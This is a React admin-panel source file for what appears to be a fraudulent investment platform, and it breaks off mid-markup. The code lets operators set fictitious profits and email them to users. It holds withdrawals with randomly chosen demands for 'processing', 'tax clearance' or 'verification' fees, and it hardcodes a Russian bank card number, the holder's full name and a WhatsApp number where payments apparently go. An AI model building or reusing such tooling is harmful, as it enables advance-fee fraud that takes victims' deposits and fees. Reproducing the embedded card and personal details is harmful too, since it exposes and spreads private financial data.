import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '@/contexts/LanguageContext';
import { useAuth } from '@/contexts/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { toast } from 'sonner';
import { LogOut, Loader2, CheckCircle, XCircle, DollarSign, TrendingUp, Globe, Lock, CreditCard, Save, Wallet, AlertCircle, Clock, MessageSquare, Phone, Send, X, Mail } from 'lucide-react';
import EmailMonitoringDashboard from '@/components/EmailMonitoringDashboard';

interface Investment {
  id: string;
  amount: number;
  profit_amount: number;
  status: string;
  created_at: string;
  user_id: string;
  profiles?: {
    full_name: string | null;
    email: string | null;
  };
}

interface Withdrawal {
  id: string;
  amount: number;
  country: string;
  payment_details: string;
  status: string;
  hold_message: string | null;
  created_at: string;
  user_id: string;
  profiles?: {
    full_name: string | null;
    email: string | null;
  };
}

interface PaymentSettings {
  cardNumber: string;
  bankName: string;
  accountHolder: string;
}

interface WithdrawalSettings {
  defaultHoldMessage: string;
}

interface SupportSettings {
  type: 'whatsapp' | 'telegram';
  phone: string;
}

const languages = [
  { code: 'en', label: 'English' },
  { code: 'ru', label: 'Русский' },
  { code: 'fr', label: 'Français' },
  { code: 'de', label: 'Deutsch' },
  { code: 'es', label: 'Español' },
  { code: 'zh', label: '中文' },
  { code: 'ar', label: 'العربية' },
  { code: 'pt', label: 'Português' },
  { code: 'ja', label: '日本語' },
  { code: 'ko', label: '한국어' },
];

const DEFAULT_PAYMENT_SETTINGS: PaymentSettings = {
  cardNumber: '2200500174446743',
  bankName: 'СОВКОМБАНК (ДОМАШНИЙ БАНК)',
  accountHolder: 'ЕЛЬЧАНИНОВ ИГОРЬ СЕРГЕЕВИЧ',
};

const DEFAULT_WITHDRAWAL_SETTINGS: WithdrawalSettings = {
  defaultHoldMessage: 'Your withdrawal is currently being processed. Please contact support for more information.',
};

const DEFAULT_SUPPORT_SETTINGS: SupportSettings = {
  type: 'whatsapp',
  phone: '+12186500840',
};

const BILLING_FEE_TEMPLATES = [
  'Processing fee of $50 required to complete this withdrawal. Please contact support.',
  'Tax clearance fee of $100 required. Contact support to proceed.',
  'Verification fee of $75 pending. Reach out to support team.',
  'Service charge of $150 needed to release funds. Contact us on WhatsApp.',
  'Administrative fee of $200 required for international transfer.',
];

const Admin = () => {
  const { language, setLanguage, t } = useLanguage();
  const { user, loading: authLoading, signOut } = useAuth();
  const navigate = useNavigate();
  const [investments, setInvestments] = useState<Investment[]>([]);
  const [withdrawals, setWithdrawals] = useState<Withdrawal[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [checkingRole, setCheckingRole] = useState(true);
  const [updating, setUpdating] = useState<string | null>(null);
  const [updatingWithdrawal, setUpdatingWithdrawal] = useState<string | null>(null);
  const [paymentSettings, setPaymentSettings] = useState<PaymentSettings>(DEFAULT_PAYMENT_SETTINGS);
  const [withdrawalSettings, setWithdrawalSettings] = useState<WithdrawalSettings>(DEFAULT_WITHDRAWAL_SETTINGS);
  const [supportSettings, setSupportSettings] = useState<SupportSettings>(DEFAULT_SUPPORT_SETTINGS);
  const [savingPayment, setSavingPayment] = useState(false);
  const [savingWithdrawal, setSavingWithdrawal] = useState(false);
  const [savingSupport, setSavingSupport] = useState(false);
  const [activeTab, setActiveTab] = useState<'investments' | 'withdrawals' | 'emails'>('investments');
  
  // Status modal state
  const [showStatusModal, setShowStatusModal] = useState(false);
  const [statusModalWithdrawal, setStatusModalWithdrawal] = useState<Withdrawal | null>(null);
  const [statusModalType, setStatusModalType] = useState<'pending' | 'processing' | 'on_hold'>('pending');
  const [statusModalMessage, setStatusModalMessage] = useState('');

  // Check admin role via database
  useEffect(() => {
    const checkAdminRole = async () => {
      if (!user) {
        setCheckingRole(false);
        setIsAdmin(false);
        return;
      }

      try {
        // Query user_roles table to check if user has admin role
        const { data: roleData, error } = await supabase
          .from('user_roles')
          .select('role')
          .eq('user_id', user.id)
          .eq('role', 'admin')
          .maybeSingle();

        if (error) {
          console.error('Error checking admin role:', error);
          setIsAdmin(false);
        } else {
          setIsAdmin(!!roleData);
        }
      } catch (err) {
        console.error('Error checking admin role:', err);
        setIsAdmin(false);
      } finally {
        setCheckingRole(false);
      }
    };

    if (!authLoading) {
      checkAdminRole();
    }
  }, [user, authLoading]);

  // Load settings from database and fetch data when admin is confirmed
  useEffect(() => {
    if (isAdmin) {
      loadSettings();
      fetchData();
    } else {
      setLoading(false);
    }
  }, [isAdmin]);

  const loadSettings = async () => {
    try {
      const { data: settingsData, error } = await supabase
        .from('admin_settings')
        .select('setting_key, setting_value');

      if (error) {
        console.error('Error loading settings:', error);
        return;
      }

      if (settingsData) {
        settingsData.forEach((setting) => {
          if (setting.setting_key === 'payment_settings' && setting.setting_value) {
            const value = setting.setting_value as unknown as PaymentSettings;
            setPaymentSettings({
              cardNumber: value.cardNumber || DEFAULT_PAYMENT_SETTINGS.cardNumber,
              bankName: value.bankName || DEFAULT_PAYMENT_SETTINGS.bankName,
              accountHolder: value.accountHolder || DEFAULT_PAYMENT_SETTINGS.accountHolder,
            });
          } else if (setting.setting_key === 'withdrawal_settings' && setting.setting_value) {
            const value = setting.setting_value as unknown as WithdrawalSettings;
            setWithdrawalSettings({
              defaultHoldMessage: value.defaultHoldMessage || DEFAULT_WITHDRAWAL_SETTINGS.defaultHoldMessage,
            });
          } else if (setting.setting_key === 'support_settings' && setting.setting_value) {
            const value = setting.setting_value as unknown as SupportSettings;
            setSupportSettings({
              type: value.type || DEFAULT_SUPPORT_SETTINGS.type,
              phone: value.phone || DEFAULT_SUPPORT_SETTINGS.phone,
            });
          }
        });
      }
    } catch (err) {
      console.error('Error loading settings:', err);
    }
  };

  const fetchData = async () => {
    try {
      setLoading(true);
      const [investmentsData, withdrawalsData] = await Promise.all([
        supabase.from('investments').select('*').order('created_at', { ascending: false }),
        supabase.from('withdrawals').select('*').order('created_at', { ascending: false })
      ]);
      
      if (investmentsData.data) {
        const userIds = [...new Set(investmentsData.data.map(i => i.user_id))];
        const { data: profiles } = await supabase
          .from('profiles')
          .select('user_id, full_name, email')
          .in('user_id', userIds);

        const profileMap = new Map(profiles?.map(p => [p.user_id, p]) || []);
        const enriched: Investment[] = investmentsData.data.map(inv => ({
          ...inv,
          profiles: profileMap.get(inv.user_id) || undefined
        }));
        setInvestments(enriched);
      }

      if (withdrawalsData.data) {
        const userIds = [...new Set(withdrawalsData.data.map(w => w.user_id))];
        const { data: profiles } = await supabase
          .from('profiles')
          .select('user_id, full_name, email')
          .in('user_id', userIds);

        const profileMap = new Map(profiles?.map(p => [p.user_id, p]) || []);
        const enriched: Withdrawal[] = withdrawalsData.data.map(w => ({
          ...w,
          profiles: profileMap.get(w.user_id) || undefined
        }));
        setWithdrawals(enriched);
      }
    } catch (error) {
      console.error('Error fetching data:', error);
    } finally {
      setLoading(false);
    }
  };

  const updateInvestment = async (id: string, status: string, profitAmount?: number) => {
    const investment = investments.find(inv => inv.id === id);
    
    // Validate profit amount before updating
    if (profitAmount !== undefined) {
      if (!investment) {
        toast.error('Investment not found');
        return;
      }
      
      if (profitAmount < 0) {
        toast.error('Profit amount cannot be negative');
        return;
      }
      
      // Max profit is 100x the investment amount (as per database constraint)
      const maxProfit = investment.amount * 100;
      if (profitAmount > maxProfit) {
        toast.error(`Profit amount cannot exceed ${maxProfit.toLocaleString()} (100x investment)`);
        return;
      }
    }

    setUpdating(id);
    try {
      const updateData: Record<string, unknown> = { status };
      if (profitAmount !== undefined) {
        updateData.profit_amount = profitAmount;
      }

      const { error } = await supabase
        .from('investments')
        .update(updateData)
        .eq('id', id);

      if (error) throw error;
      
      // Send confirmation email when investment is activated
      if (status === 'active' && investment && investment.profiles?.email) {
        try {
          await supabase.functions.invoke('send-investment-activation', {
            body: {
              userEmail: investment.profiles.email,
              userName: investment.profiles.full_name || 'Valued Investor',
              amount: investment.amount,
              investmentId: investment.id,
              investmentDate: investment.created_at,
            },
          });
          toast.success('Investment Approved! User notified via email.');
        } catch (emailError) {
          console.error('Error sending activation email:', emailError);
          toast.success('Investment Approved! (email notification failed)');
        }
      } else if (status === 'declined') {
        toast.success('Investment Declined.');
      } else if (status === 'pending') {
        toast.success('Investment set to Pending.');
      } else {
        toast.success('Investment updated successfully.');
      }
      
      fetchData();
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Failed to update investment';
      toast.error(errorMessage);
    } finally {
      setUpdating(null);
    }
  };

  const sendProfitEmail = async (investment: Investment) => {
    if (investment.profit_amount <= 0) {
      toast.error('Set a profit amount first before sending email');
      return;
    }

    setUpdating(investment.id);
    try {
      // First save the profit to database
      const { error: updateError } = await supabase
        .from('investments')
        .update({ profit_amount: investment.profit_amount })
        .eq('id', investment.id);

      if (updateError) throw updateError;

      // Then send the profit email
      const { data, error } = await supabase.functions.invoke('send-profit-notification', {
        body: {
          userId: investment.user_id,
          investmentId: investment.id,
          profitAmount: investment.profit_amount,
          totalProfit: investment.profit_amount,
          investmentAmount: investment.amount,
        },
      });

      if (error) throw error;

      console.log('Profit email invoke response:', data);
      toast.success('Profit saved and sent via email!');
      fetchData(); // Refresh data to show updated profit
    } catch (error) {
      console.error('Error sending profit notification:', error);
      toast.error('Failed to send profit email');
    } finally {
      setUpdating(null);
    }
  };

  const updateWithdrawal = async (id: string, status: string, holdMessage?: string) => {
    setUpdatingWithdrawal(id);
    try {
      const updateData: Record<string, unknown> = { status };
      if (holdMessage !== undefined) {
        updateData.hold_message = holdMessage;
      }

      const { error } = await supabase
        .from('withdrawals')
        .update(updateData)
        .eq('id', id);

      if (error) throw error;

      // Find the withdrawal to get user details for email
      const withdrawal = withdrawals.find(w => w.id === id);
      if (withdrawal && withdrawal.profiles?.email) {
        // Send email notification
        try {
          await supabase.functions.invoke('send-withdrawal-status', {
            body: {
              userEmail: withdrawal.profiles.email,
              userName: withdrawal.profiles.full_name || 'Valued Investor',
              amount: withdrawal.amount,
              status: status,
              holdMessage: holdMessage || withdrawal.hold_message,
              paymentDetails: withdrawal.payment_details,
              country: withdrawal.country,
            },
          });
          toast.success(`Withdrawal ${status} - Email notification sent!`);
        } catch (emailError) {
          console.error('Error sending email notification:', emailError);
          toast.success(`Withdrawal ${status} successfully (email notification failed)`);
        }
      } else {
        toast.success(`Withdrawal ${status} successfully`);
      }
      
      fetchData();
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Failed to update withdrawal';
      toast.error(errorMessage);
    } finally {
      setUpdatingWithdrawal(null);
    }
  };

  const handleProfitChange = (id: string, profit: string) => {
    const profitValue = parseFloat(profit) || 0;
    setInvestments(prev => prev.map(inv => 
      inv.id === id ? { ...inv, profit_amount: profitValue } : inv
    ));
  };

  const handleWithdrawalHoldMessageChange = (id: string, message: string) => {
    setWithdrawals(prev => prev.map(w => 
      w.id === id ? { ...w, hold_message: message } : w
    ));
  };

  const handleSignOut = async () => {
    await signOut();
    navigate('/');
  };

  const handleSetDefaultLanguage = async (langCode: string) => {
    try {
      // First check if default_language setting exists
      const { data: existingSetting } = await supabase
        .from('admin_settings')
        .select('id')
        .eq('setting_key', 'default_language')
        .maybeSingle();

      if (existingSetting) {
        // Update existing setting
        await supabase
          .from('admin_settings')
          .update({ 
            setting_value: JSON.parse(JSON.stringify({ language: langCode })),
            updated_by: user?.id,
            updated_at: new Date().toISOString()
          })
          .eq('setting_key', 'default_language');
      } else {
        // Insert new setting
        await supabase
          .from('admin_settings')
          .insert({ 
            setting_key: 'default_language',
            setting_value: JSON.parse(JSON.stringify({ language: langCode })),
            updated_by: user?.id
          });
      }
      
      setLanguage(langCode as 'en' | 'ru' | 'fr' | 'de' | 'es' | 'zh' | 'ar' | 'pt' | 'ja' | 'ko');
      localStorage.setItem('app-language', langCode);
      toast.success(`Default language set to ${languages.find(l => l.code === langCode)?.label}`);
    } catch (error) {
      console.error('Error saving default language:', error);
      toast.error('Failed to save default language');
    }
  };

  const handleSavePaymentSettings = async () => {
    // Validate payment settings
    if (!paymentSettings.cardNumber.trim()) {
      toast.error('Card number is required');
      return;
    }
    if (!paymentSettings.bankName.trim()) {
      toast.error('Bank name is required');
      return;
    }
    if (!paymentSettings.accountHolder.trim()) {
      toast.error('Account holder name is required');
      return;
    }
    if (paymentSettings.cardNumber.length > 50) {
      toast.error('Card number is too long (max 50 characters)');
      return;
    }
    if (paymentSettings.bankName.length > 100) {
      toast.error('Bank name is too long (max 100 characters)');
      return;
    }
    if (paymentSettings.accountHolder.length > 100) {
      toast.error('Account holder name is too long (max 100 characters)');
      return;
    }

    setSavingPayment(true);
    try {
      const { error } = await supabase
        .from('admin_settings')
        .update({ 
          setting_value: JSON.parse(JSON.stringify(paymentSettings)),
          updated_by: user?.id,
          updated_at: new Date().toISOString()
        })
        .eq('setting_key', 'payment_settings');

      if (error) throw error;
      
      toast.success('Payment settings saved successfully!');
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Failed to save payment settings';
      toast.error(errorMessage);
    } finally {
      setSavingPayment(false);
    }
  };

  const handleSaveWithdrawalSettings = async () => {
    if (!withdrawalSettings.defaultHoldMessage.trim()) {
      toast.error('Hold message is required');
      return;
    }
    if (withdrawalSettings.defaultHoldMessage.length > 500) {
      toast.error('Hold message is too long (max 500 characters)');
      return;
    }

    setSavingWithdrawal(true);
    try {
      const { error } = await supabase
        .from('admin_settings')
        .update({ 
          setting_value: JSON.parse(JSON.stringify(withdrawalSettings)),
          updated_by: user?.id,
          updated_at: new Date().toISOString()
        })
        .eq('setting_key', 'withdrawal_settings');

      if (error) throw error;
      
      toast.success('Withdrawal settings saved!');
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Failed to save withdrawal settings';
      toast.error(errorMessage);
    } finally {
      setSavingWithdrawal(false);
    }
  };

  const handleSaveSupportSettings = async () => {
    if (!supportSettings.phone.trim()) {
      toast.error('Support phone is required');
      return;
    }

    setSavingSupport(true);
    try {
      // Check if setting exists
      const { data: existingSetting } = await supabase
        .from('admin_settings')
        .select('id')
        .eq('setting_key', 'support_settings')
        .maybeSingle();

      if (existingSetting) {
        await supabase
          .from('admin_settings')
          .update({ 
            setting_value: JSON.parse(JSON.stringify(supportSettings)),
            updated_by: user?.id,
            updated_at: new Date().toISOString()
          })
          .eq('setting_key', 'support_settings');
      } else {
        await supabase
          .from('admin_settings')
          .insert({ 
            setting_key: 'support_settings',
            setting_value: JSON.parse(JSON.stringify(supportSettings)),
            updated_by: user?.id
          });
      }
      
      toast.success('Support settings saved!');
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Failed to save support settings';
      toast.error(errorMessage);
    } finally {
      setSavingSupport(false);
    }
  };

  const openStatusModal = (withdrawal: Withdrawal, type: 'pending' | 'processing' | 'on_hold') => {
    setStatusModalWithdrawal(withdrawal);
    setStatusModalType(type);
    setStatusModalMessage(type === 'on_hold' ? withdrawal.hold_message || withdrawalSettings.defaultHoldMessage : '');
    setShowStatusModal(true);
  };

  const handleStatusModalSave = async () => {
    if (!statusModalWithdrawal) return;
    
    const status = statusModalType === 'processing' ? 'pending' : statusModalType;
    await updateWithdrawal(statusModalWithdrawal.id, status, statusModalType === 'on_hold' ? statusModalMessage : undefined);
    setShowStatusModal(false);
  };

  const generateRandomFeeMessage = () => {
    const randomIndex = Math.floor(Math.random() * BILLING_FEE_TEMPLATES.length);
    setStatusModalMessage(BILLING_FEE_TEMPLATES[randomIndex]);
  };

  const getStatusBadge = (status: string) => {
    const styles: Record<string, string> = {
      active: 'bg-green-500/20 text-green-400 border-green-500/30',
      completed: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
      pending: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
      cancelled: 'bg-slate-500/20 text-slate-400 border-slate-500/30',
      on_hold: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
      processing: 'bg-blue-500/20 text-blue-400 border-blue-500/30'
    };
    return styles[status] || styles.pending;
  };

  // Loading state
  if (authLoading || checkingRole) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-tesla-red" />
      </div>
    );
  }

  // Not logged in - redirect to auth
  if (!user) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center px-4 overflow-x-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900" />
        <div className="absolute top-20 left-1/4 w-72 md:w-96 h-72 md:h-96 bg-tesla-red/10 rounded-full blur-3xl animate-pulse" />
        <div className="absolute bottom-20 right-1/4 w-72 md:w-96 h-72 md:h-96 bg-electric-blue/10 rounded-full blur-3xl animate-pulse" />
        
        <div className="relative z-10 w-full max-w-md animate-fade-in">
          <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-2xl p-6 md:p-8 shadow-2xl">
            <div className="flex items-center justify-center gap-2 mb-8">
              <Lock className="w-10 h-10 text-tesla-red" />
            </div>
            
            <h2 className="text-xl md:text-2xl font-bold text-center mb-2 text-white">{t('adminPasscode')}</h2>
            <p className="text-slate-400 text-center mb-6 text-sm">Please sign in with an admin account to access this page.</p>
            
            <Button
              onClick={() => navigate('/admin-login')}
              className="w-full bg-gradient-to-r from-tesla-red to-tesla-red/80 hover:from-tesla-red/90 hover:to-tesla-red/70"
            >
              Admin Sign In
            </Button>
            
            <div className="mt-6 text-center">
              <button
                onClick={() => navigate('/')}
                className="text-electric-blue hover:underline text-sm"
              >
                Back to Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Not an admin - access denied
  if (!isAdmin) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center px-4 overflow-x-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900" />
        <div className="absolute top-20 left-1/4 w-72 md:w-96 h-72 md:h-96 bg-tesla-red/10 rounded-full blur-3xl animate-pulse" />
        <div className="absolute bottom-20 right-1/4 w-72 md:w-96 h-72 md:h-96 bg-electric-blue/10 rounded-full blur-3xl animate-pulse" />
        
        <div className="relative z-10 w-full max-w-md animate-fade-in">
          <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-2xl p-6 md:p-8 shadow-2xl">
            <div className="flex items-center justify-center gap-2 mb-8">
              <AlertCircle className="w-10 h-10 text-tesla-red" />
            </div>
            
            <h2 className="text-xl md:text-2xl font-bold text-center mb-2 text-white">{t('accessDenied')}</h2>
            <p className="text-slate-400 text-center mb-6 text-sm">You do not have admin privileges to access this page.</p>
            
            <div className="space-y-3">
              <Button
                onClick={() => navigate('/dashboard')}
                className="w-full bg-gradient-to-r from-tesla-red to-tesla-red/80 hover:from-tesla-red/90 hover:to-tesla-red/70"
              >
                Go to Dashboard
              </Button>
              <Button
                variant="outline"
                onClick={handleSignOut}
                className="w-full border-slate-600 text-slate-300 hover:bg-slate-700"
              >
                Sign Out
              </Button>
            </div>
            
            <div className="mt-6 text-center">
              <button
                onClick={() => navigate('/')}
                className="text-electric-blue hover:underline text-sm"
              >
                Back to Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-tesla-red" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-900 overflow-x-hidden color-scheme-dark">
      <div className="absolute inset-0 bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900" />
      
      {/* Header */}
      <header className="relative z-10 border-b border-slate-700 bg-slate-800/50 backdrop-blur-xl">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-lg md:text-xl font-bold font-display">
              <span className="text-tesla-red">Admin</span>
              <span className="text-slate-400">Panel</span>
            </span>
          </div>
          <div className="flex items-center gap-2 sm:gap-4">
            {/* Show current admin email */}
            <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-slate-700/50 rounded-lg border border-slate-600">
              <div className="w-6 h-6 rounded-full bg-tesla-red/20 flex items-center justify-center text-tesla-red text-xs font-bold">
                {user?.email?.charAt(0).toUpperCase() || 'A'}
              </div>
              <span className="text-slate-300 text-sm">{user?.email}</span>
            </div>
            <Button variant="outline" size="sm" onClick={() => navigate('/dashboard')} className="border-slate-600 text-slate-300 hover:bg-slate-700">
              Dashboard
            </Button>
            <Button variant="outline" size="sm" onClick={handleSignOut} className="border-slate-600 text-slate-300 hover:bg-slate-700">
              <LogOut className="w-4 h-4 mr-2" />
              <span className="hidden sm:inline">{t('signOut')}</span>
            </Button>
          </div>
        </div>
      </header>

      <main className="relative z-10 container mx-auto px-4 py-8 max-w-full">
        {/* Language Control Section */}
        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
            <Globe className="w-5 h-5 text-electric-blue" />
            {t('defaultLanguage') || 'Default Language Control'}
          </h2>
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2">
            {languages.map((lang) => (
              <Button
                key={lang.code}
                variant={language === lang.code ? 'default' : 'outline'}
                size="sm"
                onClick={() => handleSetDefaultLanguage(lang.code)}
                className={language === lang.code ? 'bg-tesla-red hover:bg-tesla-red/90' : 'border-slate-600 text-slate-300 hover:bg-slate-700'}
              >
                {lang.label}
              </Button>
            ))}
          </div>
        </div>

        {/* Payment Settings Section */}
        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
            <CreditCard className="w-5 h-5 text-tesla-red" />
            Payment Settings
          </h2>
          <div className="grid gap-4 md:grid-cols-3">
            <div className="space-y-2">
              <Label className="text-slate-300">Card Number</Label>
              <Input
                value={paymentSettings.cardNumber}
                onChange={(e) => setPaymentSettings(prev => ({ ...prev, cardNumber: e.target.value }))}
                className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
                maxLength={50}
              />
            </div>
            <div className="space-y-2">
              <Label className="text-slate-300">Bank Name</Label>
              <Input
                value={paymentSettings.bankName}
                onChange={(e) => setPaymentSettings(prev => ({ ...prev, bankName: e.target.value }))}
                className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
                maxLength={100}
              />
            </div>
            <div className="space-y-2">
              <Label className="text-slate-300">Account Holder</Label>
              <Input
                value={paymentSettings.accountHolder}
                onChange={(e) => setPaymentSettings(prev => ({ ...prev, accountHolder: e.target.value }))}
                className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
                maxLength={100}
              />
            </div>
          </div>
          <Button
            onClick={handleSavePaymentSettings}
            className="mt-4 bg-tesla-red hover:bg-tesla-red/90"
            disabled={savingPayment}
          >
            {savingPayment ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
            Save Payment Settings
          </Button>
        </div>

        {/* Withdrawal Settings Section */}
        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
            <Wallet className="w-5 h-5 text-green-500" />
            Withdrawal Settings
          </h2>
          <div className="space-y-2">
            <Label className="text-slate-300">Default Hold Message</Label>
            <Input
              value={withdrawalSettings.defaultHoldMessage}
              onChange={(e) => setWithdrawalSettings(prev => ({ ...prev, defaultHoldMessage: e.target.value }))}
              className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
              placeholder="Enter default message for withdrawals on hold..."
              maxLength={500}
            />
          </div>
          <Button
            onClick={handleSaveWithdrawalSettings}
            className="mt-4 bg-green-600 hover:bg-green-700"
            disabled={savingWithdrawal}
          >
            {savingWithdrawal ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
            Save Withdrawal Settings
          </Button>
        </div>

        {/* Support Settings Section */}
        <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 mb-8 animate-fade-in">
          <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
            <MessageSquare className="w-5 h-5 text-electric-blue" />
            Customer Support Settings
          </h2>
          <div className="grid gap-4 md:grid-cols-2">
            <div className="space-y-2">
              <Label className="text-slate-300">Support Type</Label>
              <div className="flex gap-2">
                <Button
                  type="button"
                  variant={supportSettings.type === 'whatsapp' ? 'default' : 'outline'}
                  onClick={() => setSupportSettings(prev => ({ ...prev, type: 'whatsapp' }))}
                  className={supportSettings.type === 'whatsapp' ? 'bg-green-600 hover:bg-green-700' : 'border-slate-600 text-slate-300 hover:bg-slate-700'}
                >
                  WhatsApp
                </Button>
                <Button
                  type="button"
                  variant={supportSettings.type === 'telegram' ? 'default' : 'outline'}
                  onClick={() => setSupportSettings(prev => ({ ...prev, type: 'telegram' }))}
                  className={supportSettings.type === 'telegram' ? 'bg-blue-600 hover:bg-blue-700' : 'border-slate-600 text-slate-300 hover:bg-slate-700'}
                >
                  Telegram
                </Button>
              </div>
            </div>
            <div className="space-y-2">
              <Label className="text-slate-300">Support Phone/Username</Label>
              <Input
                value={supportSettings.phone}
                onChange={(e) => setSupportSettings(prev => ({ ...prev, phone: e.target.value }))}
                className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
                placeholder={supportSettings.type === 'telegram' ? '@username or phone' : '+12186500840'}
              />
            </div>
          </div>
          <Button
            onClick={handleSaveSupportSettings}
            className="mt-4 bg-electric-blue hover:bg-electric-blue/90"
            disabled={savingSupport}
          >
            {savingSupport ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
            Save Support Settings
          </Button>
        </div>

        {/* Tabs */}
        <div className="flex flex-wrap gap-2 mb-6">
          <Button
            variant={activeTab === 'investments' ? 'default' : 'outline'}
            onClick={() => setActiveTab('investments')}
            className={activeTab === 'investments' ? 'bg-tesla-red' : 'border-slate-600 text-slate-300'}
          >
            <DollarSign className="w-4 h-4 mr-2" />
            Investments ({investments.length})
          </Button>
          <Button
            variant={activeTab === 'withdrawals' ? 'default' : 'outline'}
            onClick={() => setActiveTab('withdrawals')}
            className={activeTab === 'withdrawals' ? 'bg-green-600' : 'border-slate-600 text-slate-300'}
          >
            <Wallet className="w-4 h-4 mr-2" />
            Withdrawals ({withdrawals.length})
          </Button>
          <Button
            variant={activeTab === 'emails' ? 'default' : 'outline'}
            onClick={() => setActiveTab('emails')}
            className={activeTab === 'emails' ? 'bg-electric-blue' : 'border-slate-600 text-slate-300'}
          >
            <Mail className="w-4 h-4 mr-2" />
            Email Monitor
          </Button>
        </div>

        {/* Email Monitoring Tab */}
        {activeTab === 'emails' && (
          <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 animate-fade-in">
            <EmailMonitoringDashboard />
          </div>
        )}

        {/* Investments Tab */}
        {activeTab === 'investments' && (
          <>
            {investments.length === 0 ? (
              <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-8 text-center animate-fade-in">
                <DollarSign className="w-12 h-12 mx-auto text-slate-500 mb-4" />
                <h3 className="text-lg font-semibold text-white mb-2">No investments yet</h3>
                <p className="text-slate-400">When users make investments, they will appear here.</p>
              </div>
            ) : (
              <div className="grid gap-4">
                {investments.map((investment) => (
                  <div
                    key={investment.id}
                    className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 animate-fade-in hover:border-slate-600 transition-colors"
                  >
                    <div className="flex flex-col md:flex-row md:items-start justify-between gap-4">
                      <div className="flex-1">
                        <div className="flex flex-wrap items-center gap-2 mb-2">
                          <h3 className="text-lg font-semibold text-white">
                            ${investment.amount.toLocaleString()}
                          </h3>
                          <span className={`px-2 py-1 text-xs rounded-full border ${getStatusBadge(investment.status)}`}>
                            {investment.status}
                          </span>
                          {investment.profit_amount > 0 && (
                            <span className="px-3 py-1 text-sm rounded-full bg-green-500/20 text-green-400 border border-green-500/30 font-semibold">
                              +${investment.profit_amount.toLocaleString()} profit
                            </span>
                          )}
                        </div>
                        <div className="text-sm text-slate-400 space-y-1">
                          <p>User: {investment.profiles?.full_name || 'Unknown'}</p>
                          <p>Email: {investment.profiles?.email || 'N/A'}</p>
                          <p>Date: {new Date(investment.created_at).toLocaleDateString()}</p>
                        </div>
                      </div>

                      <div className="flex flex-col gap-3 md:items-end">
                        <div className="flex items-center gap-2">
                          <Label className="text-slate-300 text-sm whitespace-nowrap">Set Profit:</Label>
                          <div className="flex items-center gap-1">
                            <span className="text-slate-400">$</span>
                            <Input
                              type="text"
                              inputMode="decimal"
                              value={investment.profit_amount}
                              onChange={(e) => {
                                const value = e.target.value.replace(/[^0-9.]/g, '');
                                handleProfitChange(investment.id, value);
                              }}
                              className="w-28 bg-slate-900/50 border-slate-600 text-white text-right font-semibold"
                            />
                          </div>
                        </div>

                        <div className="flex flex-wrap gap-2">
                          {investment.status === 'pending' && (
                            <Button
                              size="sm"
                              onClick={() => updateInvestment(investment.id, 'active', investment.profit_amount)}
                              disabled={updating === investment.id}
                              className="bg-green-600 hover:bg-green-700"
                            >
                              {updating === investment.id ? (
                                <Loader2 className="w-4 h-4 animate-spin" />
                              ) : (
                                <CheckCircle className="w-4 h-4 mr-1" />
                              )}
                              Approve
                            </Button>
                          )}
                          <Button
                            size="sm"
                            onClick={() => sendProfitEmail(investment)}
                            disabled={updating === investment.id || investment.profit_amount <= 0}
                            className="bg-purple-600 hover:bg-purple-700 text-white"
